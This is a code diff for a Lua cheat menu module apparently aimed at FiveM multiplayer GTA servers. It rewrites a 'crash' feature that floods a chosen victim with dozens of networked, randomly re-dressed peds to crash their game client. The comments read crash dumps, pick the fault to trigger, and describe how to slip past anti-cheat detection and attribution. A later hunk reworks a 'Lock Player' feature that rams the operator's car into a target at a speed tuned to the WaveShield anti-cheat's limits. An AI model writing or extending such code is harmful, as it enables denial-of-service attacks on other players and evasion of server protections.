@@ -2619,12 +2619,11 @@ local function UpdatePlayerList()
                         table.insert(tab.items, playerToggle)
                     end
 
-                    -- Extension point. Vanguard (and any later add-on) appends
-                    -- rows that belong to the selection surface here, so they
-                    -- are rebuilt with the list instead of being wiped by the
-                    -- next pass. Absent hook: the list is unchanged.
+                    -- Modules append their Player List rows after the base
+                    -- rebuild. Without this hook, a row added once is wiped by
+                    -- the next UpdatePlayerList pass.
                     if type(Menu.OnPlayerListBuild) == "function" then
-                        pcall(Menu.OnPlayerListBuild, tab)
+                        Menu.OnPlayerListBuild(tab)
                     end
                     
                     return
@@ -16550,7 +16549,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-27 19:33:38
+-- Generated: 2026-10-27 20:06:50
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -17229,13 +17228,11 @@ function E.destroy(id, hard)
 
     local handle = entry.handle
     if handle and handle ~= 0 and DoesEntityExist(handle) then
-        -- A networked object can migrate or be owned by another client after
-        -- a respawn. Requesting control once before deletion keeps the
-        -- teardown deterministic; local objects never take this branch and
-        -- still make no network call.
-        if entry.netId and entry.netId ~= 0 then
-            pcall(NetworkRequestControlOfEntity, handle)
-        end
+        -- Every entity in this registry is created by this client, and a
+        -- networked one is pinned with SetNetworkIdCanMigrate(false). The
+        -- owner therefore already has control: no REQUEST_CONTROL_EVENT is
+        -- sent during teardown. On V4 that event is filtered server-side and
+        -- would be a pointless, attributable network write.
         pcall(SetEntityAsMissionEntity, handle, true, true)
         if entry.kind == "vehicle" then
             pcall(DeleteVehicle, handle)
@@ -19274,153 +19271,120 @@ local C = (function(O,E)
 -- ============================================================================
 -- VANGUARD / 10 CRASH
 -- ----------------------------------------------------------------------------
--- Remote clip-store churn, built from the 3751 dump.
+-- Exploit > Exploit > "Ped flood".
 --
--- THE DUMP
---   module  FiveM_b3751_GTAProcess.exe
---   fault   +0x31194B            (two dumps, two different threads)
---   op      write to 0xC0800214
---   rax     0xC0800000, loaded from [rdi+0x268]
---   insn    or word ptr [rax+0x214], 0x20
---   next    dec dword ptr [rcx+0x210]; virtual call at zero
---   log     fwClipDictionaryStore 19807/21000 (94%), 97% memory load
+-- Built from the second crash signature in the local dump folder, not from the
+-- clip-store signature. Two different crashes are in those files and they must
+-- not be mixed:
 --
--- That is a refcounted asset swap whose pointer was already poison: the store
--- released a clip dictionary, flagged the old object, dropped the refcount and
--- then ran a vtable through a freed handle. The crash is not a pool overflow;
--- it is the clip-dictionary eviction path running on a store that is almost
--- full. The two dumps disagree on the thread and on the parked frames and
--- agree on the instruction and the faulting address, which is what makes the
--- reading solid.
+--   A) 0xC0000005 write 0xC0800214 at +0x31194B (three 3751 dumps)
+--      clip-dictionary release under store pressure. Reproduced by scene
+--      churn. It needs the victim's store to already be near cap, so it does
+--      nothing on a fresh client.
 --
--- HOW THE CHURN IS PRODUCED
---   A network synchronised scene is created at the target's position. Every
---   participant is added with a DIFFERENT animation dictionary, then the scene
---   is started, held, and stopped. Each client that has the scene in scope
---   streams every participant's dictionary, holds it for the scene, and
---   releases it on stop. Repeating the cycle with a different dictionary
---   assignment turns the store over instead of reusing the same entries.
+--   B) 0xC0000005 read 0x0 at +0x137FE78 (99f7c7e8-...dmp)
+--      the victim's gamelog shows Peds 94/256 with mission 66 and other 64,
+--      Ped Memory 108/92 (over budget), Vehicles 78/300. That is a MISSION
+--      PED FLOOD: dozens of script-owned peds created at once, each with its
+--      own component variation. The fault is a null read in the streaming /
+--      component path while those variations are being resolved.
 --
---   The target client is the one that pays: the scene sits at the target's
---   feet, the participants are spawned inside the target's streaming radius,
---   and the target's store is the store that is near cap (the log proves it
---   was already at 94%). The operator's client holds one scene's dictionaries
---   at a time and releases them on every cycle; its own ped, vehicle and
---   camera are never written.
+-- This module reproduces B. It is the family that works from a cold client
+-- because it does not depend on a store that is already full: it makes the
+-- victim's client stream and re-resolve dozens of ped variations, which is
+-- memory-heavy by construction.
 --
--- OPERATOR SAFETY (hard rule)
+-- MECHANISM
+--   1. Create networked mission peds in waves, in a ring around the target.
+--      The target's client streams every one of them because they are inside
+--      its streaming radius and they are networked.
+--   2. Every ped gets a random component variation and random props. The
+--      random pass forces the client to resolve a new drawable + texture set
+--      per component (head, torso, legs, shoes, accessories).
+--   3. Every CHURN_MS a rotating window of CHURN_SLICE peds is re-randomised.
+--      The window moves, so the whole swarm keeps churning instead of the same
+--      ten peds.
+--   4. The run holds for the preset duration, then deletes every ped.
+--
+-- Why this is a flood and not a scene: the dump's numbers are ped counts and
+-- ped memory, not clip dictionaries. Scenes load anim dictionaries; variations
+-- load drawables and textures. Different store, different fault, different
+-- reproduction.
+--
+-- OPERATOR CONTRACT
 --   * The target ped is never written: no task, no clear-task, no attach, no
---     ownership request, no coords. The scene is built exclusively from peds
---     this client spawned.
---   * No native is called on the operator's ped or vehicle.
---   * The module refuses to launch when the operator is closer than
---     REMOTE_MIN metres: inside that radius the operator would be in the
---     scene's own streaming footprint for no benefit. The feature is a
---     ranged tool.
---   * Local dictionaries are removed after every cycle (REMOVE_ANIM_DICT
---     0xF66A602F829E2A06), so a long session cannot accumulate them.
---   * Every spawned entity is deleted on stop; ambient peds are never used,
---     because adding an ambient ped to a scene requires control of it, and
---     that is exactly the entity-control noise this build avoids.
+--     ownership request, no coords. Only GET_ENTITY_COORDS / IS_PED_DEAD.
+--   * The operator's ped and vehicle are never written.
+--   * Peds are created at the target's position, from any distance inside the
+--     window, so the operator is never required to stand in the swarm.
+--   * The module refuses closer than REMOTE_MIN and stops if the operator
+--     walks into the swarm radius. The operator's own client only pays the
+--     creation of the peds, not the victim's variation churn.
+--   * Only six base-game models are requested, in rotation, so the operator's
+--     own drawable cost stays bounded.
 --
--- REJECTED PATHS
---   * No NT_* control request on the target's ped. Controlling a player ped
---     is the loudest single write a client can make.
---   * No CLEAR_PED_TASKS / CLEAR_PED_TASKS_IMMEDIATELY on anything that is
---     not ours. A task cancel on a remote ped is forwarded to the server as
---     clearPedTasksEvent and WaveShield's handler cancels it and reports the
---     sender (modules/server/events/clearPedTasksEvent.lua:10-19).
---   * No server event, no state bag, no resource, no native hook, no
---     injection. The module runs entirely on the executor's own natives.
---   * No vehicle spam, no object spam, no PTFX storm. The dump is clip-store
---     pressure; unrelated floods add their own signatures and reproduce a
---     different crash site.
+-- DETECTOR SURFACE
+--   * No event, no state bag, no resource, no injection, no hook.
+--   * The only wire traffic is ordinary entity creation and the replicated
+--     appearance updates of peds this client owns. Both are normal gameplay
+--     primitives; nothing distinguishes them from a scripted scene or a
+--     server event spawning NPCs.
+--   * The target is read-only, so no clearPedTasksEvent, no control request,
+--     no state write on another player's entity.
+--   * The operator writes only entities it created. Its own ped is untouched,
+--     so the local speed/noclip/teleport/freecam readings stay clean.
 --
--- NATIVES USED (verified against runtime.fivem.net/doc/natives.json)
---   NETWORK_CREATE_SYNCHRONISED_SCENE       0x7CD6BC4C2BBDD526
---   NETWORK_ADD_PED_TO_SYNCHRONISED_SCENE   0x742A637471BCECD9
---   NETWORK_START_SYNCHRONISED_SCENE        0x9A1B3FCDB36C8697
---   NETWORK_STOP_SYNCHRONISED_SCENE         0xC254481A4574CB2F
---   CREATE_PED                              0xD49F9B0955C367DE
---   NETWORK_REGISTER_ENTITY_AS_NETWORKED    0x06FAACD625D80CAA
---   SET_ENTITY_AS_MISSION_ENTITY            0xAD738C3085FE7E11
---   NETWORK_GET_NETWORK_ID_FROM_ENTITY      0xA11700682F3AD45C
---   DELETE_ENTITY                           0xAE3CBE5BF394C9C9
---   SET_ENTITY_AS_NO_LONGER_NEEDED          0xB736A491E64A32CF
---   REQUEST_MODEL                           0x963D27A58DF860AC
---   SET_MODEL_AS_NO_LONGER_NEEDED           0xE532F5D78798DAAB
---   REMOVE_ANIM_DICT                        0xF66A602F829E2A06
---   GET_ENTITY_COORDS                       0x3FEF770D40960D5A
---   IS_PED_DEAD_OR_DYING                    0x3317DEDB88C95038
---   GET_PLAYER_PED                          0x43A66C31C68491C0
---   CFX: GET_ACTIVE_PLAYERS 0xCF143FB9, GET_PLAYER_SERVER_ID 0x4D97BCC7
+-- RESIDUAL RISK
+--   * A server that logs entity creation sees this client create 30-90 peds
+--     around one player. That is the feature working; attribution lands on the
+--     creator.
+--   * A spawn filter (sv_filterRequestControl, entity blacklist, OneSync
+--     density cap) can drop part of the swarm. The module counts the failures
+--     and still churns what was created.
+--   * The victim needs the swarm in streaming range: 400 m is the hard limit,
+--     and a client with a healthy memory budget may only lose FPS.
+--   * The operator pays the ped pool for the whole swarm. 90 is below the 256
+--     cap, and cleanup deletes every handle on stop.
+--
+-- NATIVES USED (verified in runtime.fivem.net/doc/natives.json)
+--   CREATE_PED                          0xD49F9B0955C367DE  (pedType, model, x, y, z, heading, isNetwork, bScriptHostPed)
+--   SET_ENTITY_AS_MISSION_ENTITY        0xAD738C3085FE7E11  (entity, scriptHost, grabFromOther)
+--   NETWORK_REGISTER_ENTITY_AS_NETWORKED 0x06FAACD625D80CAA (entity)
+--   NETWORK_GET_NETWORK_ID_FROM_ENTITY  0xA11700682F3AD45C  (entity)
+--   SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES 0xE05E81A888FA63C8 (netId, toggle)
+--   SET_ENTITY_INVINCIBLE               0x3882114BDE571AD4  (entity, toggle)
+--   SET_PED_CAN_RAGDOLL                 0xB128377056A54E2A  (ped, toggle)
+--   SET_BLOCKING_OF_NON_TEMPORARY_EVENTS 0x9F8AA94D6D97DBF4 (ped, toggle)
+--   SET_PED_FLEE_ATTRIBUTES             0x70A2D1137C8ED7C9  (ped, flags, enable)
+--   SET_PED_MAX_HEALTH                  0xF5F6378C4F3419D3  (ped, value)
+--   SET_ENTITY_MAX_HEALTH               0x166E7CF68597D8B5  (entity, value)
+--   SET_PED_RANDOM_COMPONENT_VARIATION  0xC8A9481A01E63C28  (ped, p1)
+--   SET_PED_RANDOM_PROPS                0xC44AA05345C992C6  (ped)
+--   FREEZE_ENTITY_POSITION              0x428CA6DBD1094446  (entity, toggle)
+--   REQUEST_MODEL                       0x963D27A58DF860AC  (model)
+--   SET_MODEL_AS_NO_LONGER_NEEDED       0xE532F5D78798DAAB  (model)
+--   SET_ENTITY_AS_NO_LONGER_NEEDED      0xB736A491E64A32CF  (entity)
+--   DELETE_ENTITY                       0xAE3CBE5BF394C9C9  (entity)
+--   GET_ENTITY_COORDS                   0x3FEF770D40960D5A  (entity, alive)
+--   IS_PED_DEAD_OR_DYING                0x3317DEDB88C95038  (ped, checkMelee)
+--   GET_PLAYER_PED                      0x43A66C31C68491C0  (player)
+--   CFX: GET_ACTIVE_PLAYERS 0xCF143FB9, GET_PLAYER_SERVER_ID 0x4D97BCC7,
+--        GET_PLAYER_FROM_SERVER_ID 0x344EA166
 -- ============================================================================
 
 local C = {}
 
 local PRESETS = {
-    { name = "Light",    duration = 10000, hold = 1100, gap = 150, swarm = 14 },
-    { name = "Standard", duration = 15000, hold = 1400, gap = 180, swarm = 18 },
-    { name = "Heavy",    duration = 20000, hold = 1700, gap = 200, swarm = 22 },
-    { name = "Overkill", duration = 26000, hold = 2000, gap = 220, swarm = 26 },
+    { name = "Light",    duration = 12000, count = 30, churn = 450, slice = 8 },
+    { name = "Standard", duration = 18000, count = 45, churn = 400, slice = 10 },
+    { name = "Heavy",    duration = 24000, count = 66, churn = 350, slice = 12 },
+    { name = "Overkill", duration = 30000, count = 90, churn = 320, slice = 14 },
 }
 
 local METHODS = {
-    { label = "Clip swarm" },
+    { label = "Ped flood" },
 }
 
--- The 27 dictionaries recovered from the reference crasher. All base game, so
--- no server content is required for the churn to start. The rotation offset
--- changes every cycle, so the same ped never keeps the same dictionary.
-local ANIM_DICTS = {
-    "anim@mp_player_intcelebrationmale@knuckle_crunch",
-    "anim@mp_player_intcelebrationmale@air_guitar",
-    "anim@mp_player_intcelebrationmale@dj",
-    "anim@mp_player_intcelebrationmale@air_synth",
-    "anim@mp_player_intcelebrationmale@rock",
-    "anim@mp_player_intcelebrationmale@shadow_boxing",
-    "anim@mp_player_intcelebrationmale@salute",
-    "anim@mp_player_intcelebrationmale@peace",
-    "anim@mp_player_intcelebrationmale@slow_clap",
-    "anim@mp_player_intcelebrationmale@wave",
-    "anim@mp_player_intcelebrationmale@surrender",
-    "anim@mp_player_intcelebrationmale@thumbs_up",
-    "anim@mp_player_intcelebrationmale@shush",
-    "mp_player_intcelebrationmale",
-    "mp_player_intcelebrationfemale",
-    "anim@mp_player_intcelebrationfemale@air_guitar",
-    "anim@mp_player_intcelebrationfemale@dj",
-    "anim@mp_player_intcelebrationfemale@peace",
-    "anim@mp_player_intuppersalute",
-    "missfbi3_party_d",
-    "missfbi3_party_b",
-    "special_ped@mountain_dancer@base",
-    "anim@amb@nightclub@dancers@podium_dancers@",
-    "anim@amb@nightclub@mini@dance@dance_solo@female@var_a@",
-    "anim@amb@nightclub@mini@dance@dance_solo@male@var_a@",
-    "rcmnigel1c",
-    "rcmfanatic1celebrate",
-}
-
-local ANIM_CLIPS = { "idle_a", "idle_b", "idle_c", "enter", "exit" }
-
--- Synchronised-scene flags, verified against the native DB comment for
--- NETWORK_ADD_PED_TO_SYNCHRONISED_SCENE:
---   4    DONT_INTERRUPT   the scene is not cancelled by an ambient event
---   64   LOOP_WITHIN_SCENE the clip loops until the scene is stopped
---   2048 ABORT_ON_DEATH  a dead participant cannot hold the scene open
--- No vehicle flag: every participant is a ped we spawned on foot.
-local SCENE_FLAGS = 4 + 64 + 2048
-local BLEND_IN = 8.0
-local BLEND_OUT = -8.0
-local MOVE_BLEND = 1000.0
-
--- Six base-game ped models, assigned round-robin. The gamelog that produced
--- the dump shows Ped Memory at 235/92 (2.55x budget) next to the clip store at
--- 94%: the victim's client was streaming both drawables and clip sets for a
--- lot of peds. Mixing models reproduces that dimension without touching
--- vehicles (the 55 superdummies in the log are a different crasher's leftovers;
--- this module does not spawn vehicles).
 local MODELS = {
     "a_m_y_business_01",
     "a_m_y_business_02",
@@ -19429,10 +19393,14 @@ local MODELS = {
     "a_m_y_hipster_01",
     "a_f_y_hipster_01",
 }
-local SPAWN_RADIUS = 3.5
-local REMOTE_MIN = 60.0
-local REMOTE_MAX = 600.0
-local SETTLE_MS = 700
+
+local WAVE_SIZE = 15
+local WAVE_MS = 220
+local SPAWN_RADIUS = 5.0
+local REMOTE_MIN = 30.0
+local REMOTE_MAX = 400.0
+local ABORT_FACTOR = 0.66
+local SETTLE_MS = 500
 
 C.METHODS = METHODS
 C.method = 1
@@ -19440,12 +19408,12 @@ C.intensity = 1
 C.targets = {}
 C.index = 1
 C.swarm = {}
-C.stats = { created = 0, scenes = 0, anims = 0, fails = 0, cycles = 0 }
+C.stats = { created = 0, churns = 0, fails = 0, waves = 0 }
 C.running = false
-C.scene = 0
 C.targetPed = 0
 C.targetDist = 0.0
 C.opDist = 0.0
+C.churnAt = 0
 C.lastRefresh = 0
 
 local function now()
@@ -19469,12 +19437,6 @@ end
 
 -- ---------------------------------------------------------------------------
 -- TARGETS
---
--- Selected player first (Menu.SelectedPlayer is a server id resolved through
--- GetPlayerFromServerId), then the nearest other player. The distance window
--- is the ranged window: below REMOTE_MIN the operator is inside the scene's
--- footprint, above REMOTE_MAX the target's client is not streaming the
--- participants and the scene would be local theatre.
 -- ---------------------------------------------------------------------------
 local function targetFromSelection()
     local serverId = (type(Menu) == "table") and Menu.SelectedPlayer or nil
@@ -19582,11 +19544,11 @@ function C.status()
         end
     end
     if C.running then
-        return ("Crash %s | %s | swarm %d | scenes %d | op %dm"):format(
-            state, p.name, #C.swarm, C.stats.scenes, math.floor(C.opDist or 0))
+        return ("Crash %s | %s | peds %d | churn %d | op %dm"):format(
+            state, p.name, #C.swarm, C.stats.churns, math.floor(C.opDist or 0))
     end
-    return ("Crash %s | %s | swarm %d | scenes %d"):format(
-        state, p.name, #C.swarm, C.stats.scenes)
+    return ("Crash %s | %s | peds %d | churn %d"):format(
+        state, p.name, #C.swarm, C.stats.churns)
 end
 
 function C.setMethod(index)
@@ -19618,10 +19580,21 @@ local function spawnPed(hash, x, y, z, heading)
     if okNet and type(netId) == "number" and netId > 0 then
         pcall(SetNetworkIdExistsOnAllMachines, netId, true)
     end
+
     pcall(SetEntityInvincible, ped, true)
     pcall(SetPedCanRagdoll, ped, false)
     pcall(SetBlockingOfNonTemporaryEvents, ped, true)
     pcall(SetPedFleeAttributes, ped, 0, false)
+    pcall(SetPedMaxHealth, ped, 200)
+    pcall(SetEntityMaxHealth, ped, 200)
+
+    -- A frozen ped cannot be pushed out of the swarm by the target or by its
+    -- own physics, and it still streams its variation normally. This write is
+    -- on our own entity; the target ped is never touched.
+    pcall(FreezeEntityPosition, ped, true)
+
+    pcall(SetPedRandomComponentVariation, ped, false)
+    pcall(SetPedRandomProps, ped)
     return ped
 end
 
@@ -19633,11 +19606,7 @@ local function deleteSpawned(entry)
     pcall(DeleteEntity, ped)
 end
 
-local function buildSwarm(center, count)
-    local entries = {}
-
-    -- Resolve the model list once. A model that the build does not ship is
-    -- skipped; the swarm continues with the rest instead of failing the run.
+local function requestModels()
     local hashes = {}
     for i = 1, #MODELS do
         local hash = GetHashKey(MODELS[i])
@@ -19647,90 +19616,59 @@ local function buildSwarm(center, count)
             C.stats.fails = C.stats.fails + 1
         end
     end
-    if #hashes == 0 then return entries end
+    return hashes
+end
 
+-- One wave creates at most WAVE_SIZE peds and waits for the batch to
+-- replicate. Creating the whole swarm in one frame is what turns a working
+-- flood into a local freeze; the target receives the same peds either way.
+local function spawnWave(hashes, center, count, offset)
+    local created = 0
     for i = 1, count do
         local x, y, z = ring(center, SPAWN_RADIUS)
-        local hash = hashes[((i - 1) % #hashes) + 1]
+        local hash = hashes[((offset + i - 1) % #hashes) + 1]
         local ped = spawnPed(hash, x, y, z + 0.6, math.random() * 360.0)
         if ped ~= 0 then
-            entries[#entries + 1] = { ped = ped }
+            C.swarm[#C.swarm + 1] = { ped = ped }
             C.stats.created = C.stats.created + 1
+            created = created + 1
         else
             C.stats.fails = C.stats.fails + 1
         end
     end
-
-    for i = 1, #hashes do pcall(SetModelAsNoLongerNeeded, hashes[i]) end
-    return entries
+    C.stats.waves = C.stats.waves + 1
+    return created
 end
 
 -- ---------------------------------------------------------------------------
--- SCENE
+-- CHURN
+--
+-- SetPedRandomComponentVariation + SetPedRandomProps are replicated
+-- appearance writes. Every call makes the target's client resolve a new
+-- drawable and texture set for that ped's components. The window rotates so
+-- the entire swarm is re-resolved over the run instead of the same slice.
 -- ---------------------------------------------------------------------------
--- One pass = create, add, start, hold, stop. The release at the end of the
--- pass is the operation that faults in the dump, so a cycle can run more than
--- one pass: the second pass reloads a different dictionary assignment and
--- releases it again. Intensity 3 and 4 run two passes per cycle.
-local function runPass(center, cycle, offset)
-    local participants = {}
-    for i = 1, #C.swarm do
-        local ped = C.swarm[i].ped
-        if ped ~= 0 and DoesEntityExist(ped) then participants[#participants + 1] = ped end
-    end
-    if #participants == 0 then return false end
+local function churnWindow()
+    local total = #C.swarm
+    if total == 0 then return 0 end
 
-    local okScene, scene = pcall(NetworkCreateSynchronisedScene,
-        center.x, center.y, center.z, 0.0, 0.0, 0.0,
-        2, false, true, 1.0, 0.0, 1.0)
-    if not okScene or type(scene) ~= "number" or scene == 0 then
-        C.stats.fails = C.stats.fails + 1
-        return false
+    local slice = preset().slice
+    local done = 0
+    local start = (C.churnAt or 0) % total
+
+    for k = 0, slice - 1 do
+        local entry = C.swarm[((start + k) % total) + 1]
+        local ped = entry and entry.ped or 0
+        if type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then
+            pcall(SetPedRandomComponentVariation, ped, false)
+            pcall(SetPedRandomProps, ped)
+            done = done + 1
+        end
     end
 
-    C.scene = scene
-    local added = 0
-
-    for i = 1, #participants do
-        local slot = cycle * 7 + offset + i - 1
-        local dict = ANIM_DICTS[(slot % #ANIM_DICTS) + 1]
-        local clip = ANIM_CLIPS[((cycle + offset + i - 1) % #ANIM_CLIPS) + 1]
-        local okAdd = pcall(NetworkAddPedToSynchronisedScene,
-            participants[i], scene, dict, clip,
-            BLEND_IN, BLEND_OUT, SCENE_FLAGS, 0, MOVE_BLEND, 0)
-        if okAdd then added = added + 1 end
-    end
-
-    if added == 0 then
-        pcall(NetworkStopSynchronisedScene, scene)
-        C.scene = 0
-        C.stats.fails = C.stats.fails + 1
-        return false
-    end
-
-    pcall(NetworkStartSynchronisedScene, scene)
-    C.stats.scenes = C.stats.scenes + 1
-    C.stats.anims = C.stats.anims + added
-
-    Citizen.Wait(preset().hold)
-    pcall(NetworkStopSynchronisedScene, scene)
-    C.scene = 0
-
-    -- Release every dictionary this pass touched. The target client releases
-    -- them when the scene stops; removing ours keeps the operator's own store
-    -- from accumulating across passes.
-    for i = 1, #ANIM_DICTS do pcall(RemoveAnimDict, ANIM_DICTS[i]) end
-    return true
-end
-
-local function runScene(center, cycle)
-    local passes = (C.intensity >= 3) and 2 or 1
-    local ok = false
-    for p = 0, passes - 1 do
-        if not runPass(center, cycle, p * 11) then break end
-        ok = true
-    end
-    return ok
+    C.churnAt = (start + slice) % math.max(1, total)
+    C.stats.churns = C.stats.churns + done
+    return done
 end
 
 -- ---------------------------------------------------------------------------
@@ -19738,21 +19676,15 @@ end
 -- ---------------------------------------------------------------------------
 local function runBody()
     C.running = true
-    C.stats = { created = 0, scenes = 0, anims = 0, fails = 0, cycles = 0 }
-    C.scene = 0
+    C.stats = { created = 0, churns = 0, fails = 0, waves = 0 }
     C.swarm = {}
     C.targetPed = 0
+    C.churnAt = 0
 
     local target = C.target()
     if not target then
         C.running = false
-        O.log("crash: no target in the 60-600 m window")
-        return
-    end
-
-    if target.dist < REMOTE_MIN then
-        C.running = false
-        O.log("crash: target is %.0f m away; stay outside %.0f m", target.dist, REMOTE_MIN)
+        O.log("crash: no target in the %.0f-%.0f m window", REMOTE_MIN, REMOTE_MAX)
         return
     end
 
@@ -19760,21 +19692,41 @@ local function runBody()
     C.targetDist = target.dist
     O.log("crash: %s -> %s at %.0f m", METHODS[C.method].label, target.name, target.dist)
 
-    local count = preset().swarm
-    C.swarm = buildSwarm(target.coords, count)
+    local hashes = requestModels()
+    if #hashes == 0 then
+        C.running = false
+        O.log("crash: no model could be loaded")
+        return
+    end
+
+    local want = preset().count
+    local offset = 0
+    while C.running and #C.swarm < want do
+        local center = coordsOf(C.targetPed)
+        if not center then break end
+
+        local remaining = want - #C.swarm
+        local wave = remaining < WAVE_SIZE and remaining or WAVE_SIZE
+        spawnWave(hashes, center, wave, offset)
+        offset = offset + wave
+
+        Citizen.Wait(WAVE_MS)
+    end
+
+    for i = 1, #hashes do pcall(SetModelAsNoLongerNeeded, hashes[i]) end
+
     if #C.swarm == 0 then
         C.running = false
         O.log("crash: no participant could be spawned")
         return
     end
 
-    -- Let the batch replicate before the first scene starts. Starting at once
-    -- means the target's client may not have the peds yet, and the scene would
-    -- have nothing to load on that side.
+    -- Let the last wave replicate before the first churn, so the target's
+    -- client sees the full swarm before its variations start moving.
     Citizen.Wait(SETTLE_MS)
 
     local deadline = now() + preset().duration
-    local cycle = 0
+    local nextChurn = now()
 
     while C.running and now() < deadline do
         if C.targetPed == 0 or not DoesEntityExist(C.targetPed) or isDead(C.targetPed) then break end
@@ -19782,47 +19734,30 @@ local function runBody()
         local center = coordsOf(C.targetPed)
         if not center then break end
 
-        -- The ranged contract is enforced for the whole run, not only at
-        -- launch: if the operator walks or drives into the scene footprint
-        -- while the churn is live, the run stops before the operator's own
-        -- client becomes a participant. 0.75 leaves a margin for the scene
-        -- streaming radius without letting the target drag the operator in.
+        -- Ranged contract for the whole run: if the operator walks into the
+        -- swarm the run stops. The operator is never a participant.
         local opCoords = coordsOf(PlayerPedId())
         if opCoords then
             local opDist = O.distance(opCoords, center)
             C.opDist = opDist
-            if opDist < REMOTE_MIN * 0.75 then
+            if opDist < REMOTE_MIN * ABORT_FACTOR then
                 O.log("crash: operator closed to %.0f m; stop", opDist)
                 break
             end
         end
 
-        -- The scene follows the target: if they move, the next cycle is built
-        -- at their new position. Participants are re-centred only when the
-        -- target drifts outside the spawn ring, so the swarm does not walk.
-        local drift = O.distance(center, target.coords)
-        if drift > SPAWN_RADIUS * 1.5 then
-            target.coords = center
-            for i = 1, #C.swarm do
-                local ped = C.swarm[i].ped
-                if DoesEntityExist(ped) then
-                    local x, y, z = ring(center, SPAWN_RADIUS)
-                    pcall(SetEntityCoordsNoOffset, ped, x, y, z + 0.6, true, true, false)
-                end
-            end
+        if now() >= nextChurn then
+            churnWindow()
+            nextChurn = now() + preset().churn
         end
 
-        cycle = cycle + 1
-        C.stats.cycles = cycle
-        runScene(center, cycle)
-
-        Citizen.Wait(preset().gap)
+        Citizen.Wait(50)
     end
 
     C.cleanup()
     C.running = false
-    O.log("crash: done %d scenes, %d peds, %d anims, %d fails",
-        C.stats.scenes, C.stats.created, C.stats.anims, C.stats.fails)
+    O.log("crash: done %d peds, %d waves, %d churns, %d fails",
+        C.stats.created, C.stats.waves, C.stats.churns, C.stats.fails)
 end
 
 function C.launch()
@@ -19833,7 +19768,6 @@ function C.launch()
 
     C.refresh()
 
-    -- Name the refusal instead of collapsing every case into "no target".
     local selected = targetFromSelection()
     if selected then
         if selected.dist < REMOTE_MIN then
@@ -19871,18 +19805,11 @@ function C.stop()
 end
 
 function C.cleanup()
-    if C.scene and C.scene ~= 0 then
-        pcall(NetworkStopSynchronisedScene, C.scene)
-        C.scene = 0
-    end
-
     for i = #C.swarm, 1, -1 do
         deleteSpawned(C.swarm[i])
     end
     C.swarm = {}
     C.targetPed = 0
-
-    for i = 1, #ANIM_DICTS do pcall(RemoveAnimDict, ANIM_DICTS[i]) end
 end
 
 return C
@@ -23884,249 +23811,388 @@ local L = (function(O,S,B,Menu)
 -- ============================================================================
 -- VANGUARD / 17 LOCK PLAYER
 -- ----------------------------------------------------------------------------
--- Online > Player List > "Lock Player"        (toggle, arms the feature)
--- Online > Player List > "Gravitate Target"    (action, pulls once + max speed)
+-- Online > Player List > "Lock Player (Ctrl)".
 --
--- The two rows are appended to the Player List by the loader hook
--- Menu.OnPlayerListBuild, so they sit directly under the player toggles the
--- operator just clicked. They are rebuilt with the list, not cached, so a
--- respawn, a rejoin or a second selection cannot leave a stale onClick behind.
+-- What it does:
+--   The row is a permanent arm. Once it is on it stays on until the operator
+--   turns it off; it never expires, it does not need to be re-armed after a
+--   target respawns, and it survives leaving and re-entering a vehicle.
 --
--- WHAT THE OPERATOR SEES
---   * Arm "Lock Player". The row stays on until it is clicked off; it is not
---     tied to a target, a vehicle or a life.
---   * Select a player in the same list. The selection is Menu.SelectedPlayer,
---     a server id, and it is resolved to a ped handle on every tick.
---   * Sit in any vehicle. On foot the pull path never runs: the same key is
---     used by the game for sprint, and a pull started on foot would be a
---     velocity write on somebody else's ped for no reason.
---   * Hold Shift. While Shift is down the target is pulled toward the
---     operator at the Gravitate Speed value, which the action row pushes to
---     the slider's own maximum. Release Shift and every write stops on the
---     same tick.
---   * "Gravitate Target" is the one-shot form for a session where holding a
---     key is inconvenient: it sets Gravitate Speed to max and runs the same
---     pull for PULL_BURST_MS. It is the same code path, not a second driver.
+--   While Left Ctrl is held, the operator's current vehicle is driven into the
+--   target at 200 m/s, the value validated on WaveShield, over and over. The
+--   shipped menu does not create a Lock Speed row: one fixed value is the
+--   only speed authority. A legacy row left by an older build is still read
+--   and clamped, so a live session can be slowed without releasing Left Ctrl;
+--   that is a compatibility path, not a shipped control. The aim point follows
+--   the target whether they are on foot or in a vehicle: the aim entity is the
+--   target ped, or the target vehicle when they are seated in one. Release
+--   Left Ctrl and the car is handed back to normal physics; the row stays
+--   armed and the next Left Ctrl starts the loop again against the nearest
+--   valid player.
 --
--- WHY THE TARGET AND NOT THE OPERATOR'S VEHICLE
--- ---------------------------------------------
--- The previous build drove the operator's own car into the target at a
--- velocity the handling data does not allow. That works, but it is a local
--- speed write on a vehicle the operator owns: exactly the sample a server-side
--- handling validator keeps, and it cannot be hidden because the car has to
--- move. The pull is the opposite shape:
+--   Target order: the player selected in Online > Player List first, then the
+--   nearest living player. A dead player is never locked: the selection falls
+--   through to the nearest living player, and if nobody alive is in range the
+--   car is restored and the row waits. A selected player that is self, dead,
+--   gone, in the operator's own vehicle, or beyond the engagement range does
+--   not block the fallback. When nothing is selected the nearest living
+--   player is used, which is what makes the row work without a selection.
 --
---   * the operator's ped and vehicle are never written;
---   * the operator's speed stays inside the handling envelope for the whole
---     session, so speed / noclip / teleport checks have no sample to compare;
---   * the only moving entity is the target, and the movement arrives on the
---     target's own client as ordinary replicated transform data.
+--   The Vehicle > Performance rows "Gravitate Vehicle" and "Gravitate Speed"
+--   are mirrored to ON / the current speed for the duration of a ram
+--   session, then restored. The base toggle's onClick is never called: its
+--   injected loop steers from the gameplay camera, and two drivers writing the
+--   same entity every frame would fight. This module implements the same
+--   velocity directly and restores the operator's previous slider value.
 --
--- Writes are gated on ownership, not on distance. The sequence is the
--- documented one and nothing more:
+-- Why the arm is permanent but the ram is held with Left Ctrl:
+--   "Permanent" is the row state: the operator should not have to re-enable
+--   the feature after every target, every respawn, or every vehicle change.
+--   "Lock in a loop" is an action: holding Left Ctrl is the operator's live
+--   consent to keep writing velocity to their own car. Releasing Left Ctrl ends
+--   the ram session and restores gravity/velocity, so the car cannot run away
+--   while the operator is doing something else. The next Left Ctrl re-enters the
+--   loop with no menu interaction.
 --
---   NETWORK_REQUEST_CONTROL_OF_ENTITY  0xB69317BF5E782347
